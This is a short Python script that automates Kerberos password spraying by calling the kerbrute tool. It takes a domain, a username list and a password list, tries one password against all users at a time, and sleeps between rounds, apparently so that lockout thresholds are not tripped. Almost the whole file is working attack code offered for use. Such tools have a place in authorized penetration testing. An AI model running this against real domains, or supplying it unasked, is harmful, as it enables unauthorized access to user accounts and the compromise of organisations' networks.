import subprocess
import argparse
import time

# This script assumes you have kerbrute in /usr/local/bin/. It used kerbrute to spray a list of passwords, and wait a given amount of time in between each run.
# I made this script to avoid having to make password spraying more efficient and safer.
parser = argparse.ArgumentParser(description="Password sprayer using Kerbrute.",
                                 formatter_class=argparse.ArgumentDefaultsHelpFormatter)
parser.add_argument("--users", help="Path to username list.")
parser.add_argument("--passwords", help="Path to password list.")
parser.add_argument("--sleep", type=int, default=120, help="Minutes to sleep in between password sprays.")
parser.add_argument("--domain", help="Domain name.")
parser.add_argument("--attempts", default=1, type=int, help="Number of attempts before sleeping.")

args = parser.parse_args()

p = args.passwords
s = args.sleep
u = args.users
d = args.domain
a = args.attempts
minutes = s*60
i = 0

with open (p) as passwords:
     while (password := passwords.readline().rstrip()):
        subprocess.run(["kerbrute", "passwordspray" , "-d", d, u , password])
        i += 1
        if i == a:
            i = 0
            print("sleeping for", s,  "minute(s)")
            time.sleep(minutes)
